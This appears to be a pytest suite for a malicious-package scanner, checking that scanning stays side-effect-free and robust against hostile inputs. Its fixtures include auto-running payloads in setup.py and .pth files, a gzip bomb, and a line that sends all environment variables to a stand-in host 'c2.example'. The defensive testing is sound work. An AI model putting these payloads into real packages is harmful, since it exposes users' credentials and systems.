"""Properties that make it safe to point this tool at hostile packages."""

from __future__ import annotations

import base64
import os
import socket
import zlib

import pytest

from corpus import generate
from mpd.scanner import scan_path, scan_package
from tests.conftest import make_pkg


def test_scanning_never_executes_package_code(tmp_path):
    marker = tmp_path / "PWNED"
    pkg = tmp_path / "evil"
    (pkg / "evil").mkdir(parents=True)
    (pkg / "PKG-INFO").write_text("Name: evil\nVersion: 1.0\n")
    payload = f'open(r"{marker}", "w").write("pwned")\n'
    (pkg / "setup.py").write_text(payload + "from setuptools import setup\nsetup(name='evil')\n")
    (pkg / "evil" / "__init__.py").write_text(payload)
    (pkg / "evil.pth").write_text(f'import os; open(r"{marker}", "w").write("pwned")\n')
    scan_path(pkg)
    assert not marker.exists()


def test_scanning_the_whole_corpus_opens_no_network_connections(monkeypatch):
    def boom(*a, **k):
        raise AssertionError("the scanner attempted network access")
    monkeypatch.setattr(socket.socket, "connect", boom)
    monkeypatch.setattr(socket, "create_connection", boom)
    monkeypatch.setattr(socket, "getaddrinfo", boom)
    for s in generate():
        scan_package(s.view())


def test_scanning_writes_nothing_to_disk(tmp_path):
    import tarfile, io
    p = tmp_path / "x-1.0.tar.gz"
    with tarfile.open(p, "w:gz") as tf:
        data = b"import os\nos.system('id')\n"
        info = tarfile.TarInfo("x-1.0/setup.py")
        info.size = len(data)
        tf.addfile(info, io.BytesIO(data))
    before = {(n, os.path.getsize(tmp_path / n)) for n in os.listdir(tmp_path)}
    cwd_before = set(os.listdir("."))
    scan_path(p, "pypi")
    assert {(n, os.path.getsize(tmp_path / n)) for n in os.listdir(tmp_path)} == before
    assert set(os.listdir(".")) == cwd_before


HOSTILE_FILES = {
    "nul_bytes.py": "x = 1\x00\nexec('1')\n",
    "invalid_utf8.py": b"x = '\xff\xfe\xfa'\nexec(b'1')\n",
    "deep_nesting.py": "x = " + "(" * 400 + "1" + ")" * 400 + "\n",
    "long_chain.py": "x = " + " + ".join(["'a'"] * 6000) + "\nexec(x)\n",
    "huge_line.py": "x = '" + "A" * 400_000 + "'\n",
    "weird_urls.py": 'u = "http://[" + "http://[::1" + "https://" + "ftp://:@:"\n',
    "gzip_bomb.py": "b = '" + base64.b64encode(zlib.compress(b"A" * 40_000_000)).decode() + "'\nexec(b)\n",
    "bare_unicode.js": "const ‮ = 1; eval('\u0000');\n",
    "empty.py": "",
}


@pytest.mark.parametrize("name", sorted(HOSTILE_FILES))
def test_hostile_inputs_never_crash_or_hang(name):
    for rules in (1, 2):
        r = scan_package(make_pkg({"setup.py": HOSTILE_FILES[name], name: HOSTILE_FILES[name]}), rules_version=rules)
        assert r.verdict in ("benign", "suspicious", "malicious")


def test_analyzer_crash_is_contained_and_reported(monkeypatch, tmp_path):
    import mpd.scanner as sc

    def explode(*a, **k):
        raise RuntimeError("synthetic analyzer bug")
    monkeypatch.setattr(sc, "analyze_source", explode)
    r = scan_package(make_pkg({"pkg/__init__.py": "x = 1\n"}))
    assert any("analyzer error" in n for n in r.notes)
    assert any(f.rule_id == "SCAN-ANALYZER-ERROR" for f in r.findings)


def test_wall_clock_budget_stops_a_slow_package(monkeypatch):
    import mpd.scanner as sc
    t = {"now": 0.0}
    monkeypatch.setattr(sc.time, "monotonic", lambda: t.__setitem__("now", t["now"] + 100) or t["now"])
    files = {f"pkg/m{i}.py": "import os\nos.system('x')\n" for i in range(5)}
    r = scan_package(make_pkg(files), max_seconds=10)
    assert any("time budget" in n for n in r.notes)


def test_test_directories_are_skipped_unless_reachable():
    evil = "import os, urllib.request\nurllib.request.urlopen('http://c2.example', data=str(dict(os.environ)).encode())\n"
    hidden = scan_package(make_pkg({"pkg/__init__.py": "x = 1\n", "tests/test_x.py": evil}))
    assert hidden.verdict == "benign" and any("skipped 1 test/doc" in n for n in hidden.notes)
    # ...but if install/import code reaches into it, reachability brings it back into scope
    pulled = scan_package(make_pkg({"pkg/__init__.py": "from tests import helper\n", "tests/__init__.py": "",
                                    "tests/helper.py": "def go():\n    " + evil.replace("\n", "\n    ") + "\ngo()\n"}))
    assert any(f.rule_id == "PY-EXFIL" for f in pulled.findings)
